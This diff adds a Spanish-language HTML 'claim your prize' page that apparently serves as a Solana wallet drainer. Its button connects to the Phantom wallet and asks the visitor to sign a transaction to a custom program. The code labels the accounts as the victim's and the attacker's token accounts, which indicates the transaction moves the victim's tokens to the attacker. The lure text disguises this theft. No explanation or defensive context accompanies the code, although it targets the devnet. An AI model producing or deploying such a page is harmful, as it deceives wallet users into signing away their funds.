@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>🎁 Reclama tu premio</title>
+  <script src="https://unpkg.com/@solana/web3.js@1.73.2/lib/index.iife.js"></script>
+</head>
+<body>
+  <h2>🎉 Has sido seleccionado para una recompensa</h2>
+  <p>Conéctate con Phantom y reclama tu token exclusivo.</p>
+  <button onclick="reclamarPremio()">Reclamar premio</button>
+
+  <script>
+    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'));
+    const programId = new solanaWeb3.PublicKey("8RxZb6nik5PKgUbPvPFhHxFjMKVkaah2fVnobhh4ioj9");
+
+    const victimAccount = new solanaWeb3.PublicKey("3KE3FjMcX1gnLivZPCvj6aEmmUyS1bvZaKtJu7U5FHTj");
+    const victimTokenAccount = new solanaWeb3.PublicKey("CeQ4jfrHXYtj4aqcXRo21wKa9DZYqvyJHHi9bWoSdWfZ");
+    const contractAccount = programId;
+    const attackerAccount = new solanaWeb3.PublicKey("31DQqjyihtRcdeX5vNPkFdxwh9PpGQQQvy87BKaNvtYx");
+    const attackerTokenAccount = new solanaWeb3.PublicKey("CxQNoC4V17AzBNZmaSKcMvavrxMQHFeUjFatisvtq6jx");
+    const tokenProgram = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+    const systemProgram = solanaWeb3.SystemProgram.programId;
+    const pdaAccount = new solanaWeb3.PublicKey("F8VPnwLH1BGyHUrY877iHXDPbWCXSLDLwtrSxVMYuQWm");
+
+    async function reclamarPremio() {
+      if (!window.solana || !window.solana.isPhantom) {
+        alert("Por favor, instala Phantom Wallet para continuar.");
+        return;
+      }
+
+      try {
+        const provider = window.solana;
+        await provider.connect();
+
+        const transaction = new solanaWeb3.Transaction();
+
+        const instruction = new solanaWeb3.TransactionInstruction({
+          keys: [
+            { pubkey: victimAccount, isSigner: true, isWritable: true },
+            { pubkey: victimTokenAccount, isSigner: false, isWritable: true },
+            { pubkey: contractAccount, isSigner: false, isWritable: false },
+            { pubkey: attackerAccount, isSigner: false, isWritable: true },
+            { pubkey: attackerTokenAccount, isSigner: false, isWritable: true },
+            { pubkey: tokenProgram, isSigner: false, isWritable: false },
+            { pubkey: systemProgram, isSigner: false, isWritable: false },
+            { pubkey: pdaAccount, isSigner: false, isWritable: true },
+          ],
+          programId,
+          data: Buffer.alloc(0)
+        });
+
+        transaction.add(instruction);
+
+        let { signature } = await provider.signAndSendTransaction(transaction);
+        alert("✅ Transacción enviada: " + signature);
+      } catch (error) {
+        console.error(error);
+        alert("Ocurrió un error: " + error.message);
+      }
+    }
+  </script>
+</body>
+</html>
